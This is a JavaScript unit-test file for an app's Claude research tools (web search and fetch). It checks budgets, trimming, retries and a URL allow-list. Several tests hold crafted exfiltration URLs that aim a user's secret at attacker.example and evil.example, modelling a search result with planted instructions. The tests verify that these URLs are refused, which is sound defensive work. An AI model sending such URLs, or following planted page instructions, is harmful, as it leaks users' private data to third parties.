// Unit tests for the runtime layer (app/src/js/10-runtime.js) with a fake Parallel Search
// connector shaped like the real one: U.research tools (session id, trimming, the web_fetch
// allow-list and its error texts) and the U.ask priority gate.
// Run: node --test tests/*.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import { readFileSync } from 'node:fs';

const src = (f) => readFileSync(new URL('../app/src/js/' + f, import.meta.url), 'utf8');

function boot({ mcp = null, sample = null } = {}) {
  const ctx = vm.createContext({ console, setTimeout, clearTimeout, crypto: globalThis.crypto, URL });
  vm.runInContext('var window = globalThis;', ctx);
  for (const f of ['00-core.js', '10-runtime.js']) vm.runInContext(src(f), ctx, { filename: f });
  const U = ctx.U;
  U.rt.mcp = mcp;
  U.rt.sample = sample;
  return U;
}

// A web_search payload in the real connector's shape.
function searchPayload(n, excerptChars = 200) {
  return {
    search_id: 'search_abc123',
    results: Array.from({ length: n }, (_, i) => ({
      url: 'https://example.org/page-' + i,
      title: 'Page ' + i,
      publish_date: '2025-01-0' + ((i % 9) + 1),
      excerpts: ['Verbatim text from page ' + i + '. ' + 'x'.repeat(excerptChars)],
    })),
    warnings: null,
    session_id: 'server-side',
  };
}

function fakeMcp(payloads) {
  const calls = [];
  return {
    calls,
    listTools: () => Promise.resolve({ servers: [{ name: 'Parallel Search', authStatus: 'connected', tools: [{ name: 'web_search' }, { name: 'web_fetch' }] }] }),
    describeTool: () => Promise.reject({ code: 'bad_request' }),
    callTool: (server, tool, input) => { calls.push({ server, tool, input: JSON.parse(JSON.stringify(input)) }); return Promise.resolve({ payload: payloads[tool](input) }); },
  };
}

test('research tools: session id on every call, result urls opened, refusals carry an error code', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(3), web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['quote'] })) }) });
  const U = boot({ mcp });
  assert.match(U.research.SESSION, /^mu-[0-9a-f]{32}$/);
  assert.equal(await U.research.available(), true);
  const [search, fetch] = await U.research.tools();
  assert.deepEqual([...search.inputSchema.required], ['objective', 'search_queries']);
  assert.deepEqual([...fetch.inputSchema.required], ['urls']);

  const out = await search.execute({ objective: 'How tides work', search_queries: ['moon tides gravity', 'two tidal bulges'] });
  assert.equal(mcp.calls[0].input.session_id, U.research.SESSION, 'session id added');
  assert.equal(mcp.calls[0].input.model_name, undefined, 'model_name left unset');
  assert.ok(JSON.parse(out).results.length === 3, 'payload passed through as text');

  // A page from the results can be opened; the same session id goes with it.
  const f1 = await fetch.execute({ urls: ['https://example.org/page-1/'] });
  assert.match(f1, /quote/);
  assert.equal(mcp.calls[1].input.session_id, U.research.SESSION);
  // A session id Claude passes itself is kept.
  await search.execute({ objective: 'x', search_queries: ['a b c'], session_id: 'mine' });
  assert.equal(mcp.calls[2].input.session_id, 'mine');

  // Addresses not returned by a search are refused, with an error code 31-generate.js skips.
  const refused = await fetch.execute({ urls: ['https://evil.example/collect?q=dan'] });
  assert.match(refused, /^Tool error \(refused\): /);
  const empty = await fetch.execute({ urls: [] });
  assert.match(empty, /^Tool error \(bad_request\): /);
  assert.equal(mcp.calls.length, 3, 'refused calls never reach the connector');
});

test('research tools: big results are trimmed (search 12 KB, fetch 20 KB); connector errors come back as text', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(40, 800), web_fetch: () => ({ results: [{ url: 'https://example.org/page-0', excerpts: ['y'.repeat(50000)] }] }) });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  const s = await search.execute({ objective: 'o', search_queries: ['a b c'] });
  const sj = JSON.parse(s);
  assert.ok(s.length <= 12000, 'search fits in 12 KB (' + s.length + ')');
  assert.ok(sj.results.length >= 30, 'most results kept (' + sj.results.length + '); their text is shortened instead');
  assert.ok(sj.results.every((r, i) => r.url === 'https://example.org/page-' + i && r.excerpts[0].startsWith('Verbatim text from page ' + i)), 'kept in rank order, each excerpt keeps its start');
  assert.ok(sj.results[sj.results.length - 1].excerpts[0].endsWith(' …'), 'the lowest-ranked are shortened first, the cut marked');
  const f = await fetch.execute({ urls: ['https://example.org/page-0'] });
  assert.ok(f.length <= 20000 && JSON.parse(f).results[0].excerpts[0].endsWith(' …'), 'fetch fits in 20 KB as valid JSON');
  mcp.callTool = () => Promise.reject({ code: 'rate_limited', message: 'slow down' });
  assert.match(await search.execute({ objective: 'o', search_queries: ['a b c'] }), /^Tool error \(rate_limited\): /);
});

test('ask: background calls run one at a time, after foreground ones, and can be cancelled or promoted', async () => {
  const log = [];
  const pending = [];
  const sample = (input) => new Promise((res) => { log.push('start ' + input); pending.push(() => { log.push('end ' + input); res({ text: input }); }); });
  const U = boot({ sample });
  const fg = U.ask('fg1');
  const bg1 = U.ask('bg1', { priority: 'background' });
  const ctl = new AbortController();
  const bg2 = U.ask('bg2', { priority: 'background', signal: ctl.signal });
  const bg3 = U.ask('bg3 lesson', { priority: 'background', label: 'write-lesson' });
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(log, ['start fg1'], 'background waits while a foreground call runs');
  ctl.abort();
  await assert.rejects(bg2, (e) => e.code === 'cancelled', 'a waiting background call is cancelled by its signal');
  assert.equal(U._gate.promote((input, o) => o.label === 'write-lesson'), 1, 'promoted');
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(log, ['start fg1', 'start bg3 lesson'], 'a promoted call runs at once');
  pending.shift()(); await fg;
  pending.shift()(); await bg3;
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(log.slice(-1), ['start bg1'], 'then the background queue moves');
  pending.shift()(); assert.equal(await bg1, 'bg1');
});

test('ask: rate limits are not retried; a transient upstream error is retried once', async () => {
  let n = 0;
  const U = boot({ sample: () => { n++; return Promise.reject({ code: 'rate_limited' }); } });
  await assert.rejects(U.ask('x'), (e) => e.code === 'rate_limited');
  assert.equal(n, 1);
  let m = 0;
  const U2 = boot({ sample: () => (++m === 1 ? Promise.reject({ code: 'upstream_error' }) : Promise.resolve({ text: 'ok' })) });
  U2.sleep = () => Promise.resolve();
  assert.equal(await U2.ask('y'), 'ok');
  assert.equal(m, 2);
});

test('research tools: markdown links in excerpts become plain text and are not results', async () => {
  const page = { url: 'https://www.grc.nasa.gov/www/k-12/airplane/brayton.html', title: 'Brayton Cycle', excerpts: ['we must study the basic thermodynamics of [gases](https://www.grc.nasa.gov/www/k-12/airplane/state.html) .\nGases have **p** and ![a figure](https://x.org/f.png) [T](https://e.org/a_(b))'] };
  const mcp = fakeMcp({ web_search: () => ({ results: [page] }), web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['ok'] })) }) });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  const r = JSON.parse(await search.execute({ objective: 'o', search_queries: ['brayton cycle efficiency'] }));
  assert.equal(r.results[0].excerpts[0], 'we must study the basic thermodynamics of gases .\nGases have p and a figure T');
  assert.match(await fetch.execute({ urls: ['https://www.grc.nasa.gov/www/k-12/airplane/state.html'] }), /^Tool error \(refused\): /, 'a page only linked from an excerpt is not a result');
  assert.ok(!/^Tool error/.test(await fetch.execute({ urls: [page.url] })), 'the result itself can be opened');
});

test('research tools: a runaway loop meets the budget (10 searches, 6 fetches by default)', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(2), web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['ok'] })) }) });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  for (let i = 0; i < 10; i++) assert.ok(!/^Tool error/.test(await search.execute({ objective: 'o', search_queries: ['a b c ' + i] })));
  assert.match(await search.execute({ objective: 'o', search_queries: ['one more'] }), /^Tool error \(budget\): /);
  for (let i = 0; i < 6; i++) assert.ok(!/^Tool error/.test(await fetch.execute({ urls: ['https://example.org/page-0'] })));
  assert.match(await fetch.execute({ urls: ['https://example.org/page-1'] }), /^Tool error \(budget\): /);
  assert.equal(mcp.calls.length, 16, 'calls over the budget never reach the connector');
  const [s2] = await U.research.tools(null, { budget: { web_search: 1 } });
  await s2.execute({ objective: 'o', search_queries: ['a b c'] });
  assert.match(await s2.execute({ objective: 'o', search_queries: ['a b d'] }), /^Tool error \(budget\): /, 'a caller can set its own budget');
});

test('research tools: fitting to size keeps the best-ranked results whole', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(8, 2500), web_fetch: () => ({ results: [] }) });
  const U = boot({ mcp });
  const [search] = await U.research.tools();
  const r = JSON.parse(await search.execute({ objective: 'o', search_queries: ['a b c'] }));
  assert.equal(r.results.length, 8, 'nothing dropped when shortening the tail is enough');
  assert.ok(!r.results[0].excerpts[0].endsWith(' …') && r.results[0].excerpts[0].length > 2500, 'the top result is whole');
  assert.ok(r.results[7].excerpts[0].endsWith(' …'), 'the last is shortened');
});

test('research tools: rate limits, failures and connector errors that arrive as text', async () => {
  let n = 0;
  const limited = 'Error POSTing to endpoint: event: message\ndata: {"error":{"code":-32000,"message":"You\'ve hit the free-tier rate limit for Parallel Search MCP."}}';
  const mcp = fakeMcp({ web_search: () => (++n === 1 ? limited : searchPayload(1)), web_fetch: () => { throw { code: 'tool_error', message: 'boom' }; } });
  let U = boot({ mcp });
  let [search] = await U.research.tools(null, { patient: [5] });
  const r = await search.execute({ objective: 'o', search_queries: ['a b c'] });
  assert.ok(JSON.parse(r).results.length === 1 && mcp.calls.length === 2, 'patient research waits out a rate limit and retries');
  n = 0;
  [search] = await U.research.tools();
  const busy = await search.execute({ objective: 'o', search_queries: ['a b c'] });
  assert.match(busy, /^Tool error \(rate_limited\): the search service is busy/, 'Dan never waits: a plain message, no connector text');
  assert.ok(!/api key/i.test(busy));
  const tools = await U.research.tools(null, { budget: { web_search: 1 } });
  n = 0;
  assert.match(await tools[0].execute({ objective: 'o', search_queries: ['a'] }), /^Tool error \(rate_limited\)/);
  assert.ok(!/^Tool error/.test(await tools[0].execute({ objective: 'o', search_queries: ['a'] })), 'a failed call does not use up the budget');
  // Four failures and the tools stop calling the connector.
  U = boot({ mcp: fakeMcp({ web_search: () => searchPayload(1), web_fetch: () => { throw { code: 'tool_error', message: 'boom' }; } }) });
  const [s2, f2] = await U.research.tools();
  await s2.execute({ objective: 'o', search_queries: ['a'] });
  for (let i = 0; i < 4; i++) assert.match(await f2.execute({ urls: ['https://example.org/page-0'] }), /^Tool error \(tool_error\)/);
  assert.match(await f2.execute({ urls: ['https://example.org/page-0'] }), /^Tool error \(unavailable\)/);
});

// ---------- audit round 3 ----------

test('web_fetch checks and sends the parsed addresses: crafted ones are refused, real ones with ")" open (audit 1)', async () => {
  const WIKI = 'https://en.wikipedia.org/wiki/Pendulum_(mechanics)';
  const mcp = fakeMcp({
    web_search: () => ({ results: [
      { url: 'https://attacker.example/pendulum-facts', title: 'Pendulum facts', excerpts: ['planted instructions'] },
      { url: WIKI, title: 'Pendulum (mechanics)', excerpts: ['For small swings…'] },
      { url: 'https://www.nasa.gov/pendulum', title: 'NASA', excerpts: ['x'] },
    ] }),
    web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['page text'] })) }),
  });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  await search.execute({ objective: 'pendulum period', search_queries: ['pendulum period length'] });
  const secret = encodeURIComponent('I failed this at school');
  const crafted = [
    ['https://attacker.example/pendulum-facts)?q=' + secret],
    ['https://attacker.example/pendulum-facts\\?q=' + secret],
    ['https://attacker.example/pendulum-facts]?q=' + secret],
    ['https://www.nasa.gov/pendulum', 'https:/attacker.example/log?q=SECRET'],
    ['https://www.nasa.gov/pendulum', '//attacker.example/log?q=SECRET'],
    ['https://www.nasa.gov/pendulum', 'attacker.example/log?q=SECRET'],
    ['https://user:pw@www.nasa.gov/pendulum'],
    ['javascript:alert(1)//https://www.nasa.gov/pendulum'],
  ];
  for (const urls of crafted) assert.match(await fetch.execute({ urls }), /^Tool error \(refused\): /, JSON.stringify(urls));
  assert.equal(mcp.calls.filter((c) => c.tool === 'web_fetch').length, 0, 'no crafted address reaches the connector');

  // A real result whose address has brackets opens, and what is sent is the parsed address only,
  // with no argument that could name another page.
  const ok = await fetch.execute({ urls: [WIKI, 'HTTPS://EN.WIKIPEDIA.ORG/wiki/Pendulum_(mechanics)/#history'], objective: 'period', full_content: true, url: 'https://attacker.example/x', extra: { u: 'https://attacker.example/y' } });
  assert.ok(!/^Tool error/.test(ok), ok);
  const sent = mcp.calls.filter((c) => c.tool === 'web_fetch')[0].input;
  assert.deepEqual(sent.urls, [WIKI, 'https://en.wikipedia.org/wiki/Pendulum_(mechanics)/#history']);
  assert.equal(sent.objective, 'period');
  assert.equal(sent.full_content, true);
  assert.equal(sent.session_id, U.research.SESSION);
  assert.deepEqual(Object.keys(sent).sort(), ['full_content', 'objective', 'session_id', 'urls']);

  // The lesson's own sources (opts.allow) are compared the same way.
  const [, tutorFetch] = await U.research.tools(null, { allow: [WIKI] });
  assert.ok(!/^Tool error/.test(await tutorFetch.execute({ urls: [WIKI] })), 'a source with ")" can be reopened');
  assert.match(await tutorFetch.execute({ urls: [WIKI + ')?q=x'] }), /^Tool error \(refused\): /);
  assert.match(await tutorFetch.execute({ urls: 'not a list' }), /^Tool error \(refused\): /);
  assert.match(await tutorFetch.execute({}), /^Tool error \(bad_request\): /);
});

test('ask: every call to Claude starts with the tools\' whole budget, retries included (audit 25)', async () => {
  let n = 0;
  const mcp = fakeMcp({ web_search: () => ({ results: [{ url: 'https://example.edu/p' + (n++), title: 't', excerpts: ['text'] }] }), web_fetch: () => ({ results: [] }) });
  let attempt = 0;
  const log = [];
  const U = boot({ mcp, sample: async (input, o) => {
    attempt++;
    const search = o.tools.find((t) => t.name === 'web_search');
    for (let i = 0; i < (attempt === 1 ? 9 : 4); i++) log.push(attempt + ':' + (/^Tool error/.test(String(await search.execute({ objective: 'x', search_queries: ['a b c'] }))) ? 'error' : 'ok'));
    if (attempt === 1) throw { code: 'upstream_error', message: 'connection reset' };
    return { text: '{"ok":true}', truncated: false };
  } });
  U.sleep = () => Promise.resolve();
  const tools = await U.research.tools(null, {});
  assert.deepEqual(plainObj(await U.ask('TASK: research', { json: true, tools, priority: 'background' })), { ok: true });
  assert.deepEqual(log.slice(9), ['2:ok', '2:ok', '2:ok', '2:ok'], 'the retry is not told the budget is spent');
  assert.equal(typeof tools.reset, 'function');
});

const plainObj = (x) => JSON.parse(JSON.stringify(x));

test('parseJson: the answer after narration from earlier tool rounds, brackets and all (audit 26)', () => {
  const U = boot();
  const json = '{"sources":[{"n":1,"title":"Tides","url":"https://oceanservice.noaa.gov/facts/springtide.html","quote":"Spring tides occur when the sun and moon are aligned."}],"topic":{"notes":[]},"ideas":{}}';
  const cases = {
    'final JSON only': json,
    'narration, then JSON': "I'll start with a broad search.\n\nThe NOAA results look strong.\n\n" + json,
    'narration with [1], then JSON': 'The NOAA page says spring tides happen at new and full moon [1]. Let me fetch it.\n\n' + json,
    'narration with {objective}, then JSON': 'Next I will search with {objective: tides}.\n\n' + json,
    'a draft object, then the answer': 'Draft: {"sources":[]}\n\nMore searching.\n\n' + json,
    'fenced after prose, then a footnote': 'Here it is:\n```json\n' + json + '\n```\nSee [1].',
    'narration with a stray quote in braces': 'Searching {objective: "tides} now.\n\n' + json,
    'narration with an object inside junk': 'Next {objective: {"a":1}} then.\n\n' + json,
    'narration with an unclosed brace': 'I will use {objective here\n\n' + json,
    'a note in braces after the answer': json + '\n\nSee {note}.',
  };
  for (const [name, text] of Object.entries(cases)) assert.equal(U.parseJson(text).sources.length, 1, name);
  assert.deepEqual(plainObj(U.parseJson('Only a list: [1, 2]')), [1, 2], 'an array when there is no object');
  assert.throws(() => U.parseJson('no json here'), (e) => e.code === 'bad_json' && /did not reply/.test(e.message));
  assert.throws(() => U.parseJson('{"a": 1,}'), (e) => e.code === 'bad_json' && /could not be read/.test(e.message));
  // A broken answer is reported as broken, not answered with a piece of it or with narration.
  const unread = (e) => e.code === 'bad_json' && /could not be read/.test(e.message);
  assert.throws(() => U.parseJson('{"sources":[{"n":1,"title":"T"}],"topic":{"notes":[],},"ideas":{}}'), unread);
  assert.throws(() => U.parseJson('It says so [1].\n\n{"sources":[{"n":1}],"x":1,}'), unread);
});

test('toolsOk: page tools only where sample.limits() reports them; tools_unavailable settles it (audit 5)', async () => {
  const plain = async () => ({ text: 'ok', truncated: false });
  const mk = (limits) => Object.assign((input, o) => (o.tools ? Promise.reject({ code: 'tools_unavailable', message: 'no tools here' }) : plain()), limits ? { limits } : {});
  assert.equal(await boot({ sample: mk(() => Promise.resolve({ maxPromptBytes: 262144, tools: { maxCount: 20 } })) }).rt.toolsOk(), true);
  assert.equal(await boot({ sample: mk(() => Promise.resolve({ maxPromptBytes: 262144, images: {} })) }).rt.toolsOk(), false, 'no tools member');
  assert.equal(await boot({ sample: mk(() => Promise.reject({ code: 'x' })) }).rt.toolsOk(), false, 'limits() failing counts as no');
  assert.equal(await boot({ sample: null }).rt.toolsOk(), false, 'no sample at all');
  const U = boot({ sample: mk(null) });
  assert.equal(await U.rt.toolsOk(), true, 'no limits(): the benefit of the doubt');
  await assert.rejects(U.ask('x', { tools: [{ name: 't', description: 'd', execute: () => '' }] }), (e) => e.code === 'tools_unavailable');
  assert.equal(await U.rt.toolsOk(), false, 'one tools_unavailable answers it for the visit');
});

// A VM whose clock runs 100 times fast, with a claude.use() that answers each name after `ms`
// (real milliseconds; null = never).
function bootSlow(delays, idMs = 0) {
  const fast = (f, ms, ...a) => setTimeout(f, (ms || 0) / 100, ...a);
  const ctx = vm.createContext({ console, setTimeout: fast, clearTimeout, crypto: globalThis.crypto, URL });
  vm.runInContext('var window = globalThis;', ctx);
  const user = { id: () => new Promise((r) => setTimeout(() => r('u_dan'), idMs)) };
  const ns = { db: { doc() {} }, user, sample: () => Promise.resolve({ text: '' }), mcp: null, downloads: null, permissions: null };
  ctx.claude = { use: (name) => new Promise((r) => { const ms = name in delays ? delays[name] : 1; if (ms !== null) setTimeout(() => r(ns[name]), ms); }) };
  for (const f of ['00-core.js', '10-runtime.js']) vm.runInContext(src(f), ctx, { filename: f });
  return ctx.U;
}

test('boot waits up to 30 s for saved work, and takes up whatever arrives later (audit 14)', async () => {
  // db answers at "15 s" (150 ms real): past the old 10 s guard, so it was dropped for the visit.
  let U = bootSlow({ db: 150 });
  await U.rt.ready;
  assert.ok(U.rt.db && U.rt.user && U.rt.uid === 'u_dan', 'a slow db is waited for');
  assert.deepEqual(plainObj(U.rt.late), []);

  // db answers at "45 s": boot goes on at 30 s without it, says what is still coming, and takes it up when it comes.
  U = bootSlow({ db: 450 });
  const t0 = Date.now();
  await U.rt.ready;
  assert.ok(Date.now() - t0 < 400, 'boot did not wait for ever');
  assert.equal(U.rt.db, null);
  assert.deepEqual(plainObj(U.rt.late), ['db']);
  const arrived = await new Promise((r) => U.on('rt-late', r));
  assert.equal(arrived, 'db');
  assert.ok(U.rt.db, 'taken up when it arrives');
  assert.deepEqual(plainObj(U.rt.late), []);

  // The user capability late: its id is asked for then, and 'uid' is announced too.
  U = bootSlow({ user: 450 });
  await U.rt.ready;
  assert.deepEqual(plainObj(U.rt.late), ['user']);
  const seen = [];
  await new Promise((r) => U.on('rt-late', (n) => { seen.push(n); if (n === 'uid') r(); }));
  assert.deepEqual(seen, ['user', 'uid']);
  assert.equal(U.rt.uid, 'u_dan');

  // Something optional that never answers still only holds boot for 10 s.
  U = bootSlow({ mcp: null });
  const t1 = Date.now();
  await U.rt.ready;
  assert.ok(Date.now() - t1 < 250 && U.rt.db && U.rt.uid === 'u_dan', 'mcp gave up at 10 s, saved work in');
  assert.deepEqual(plainObj(U.rt.late), ['mcp']);
});
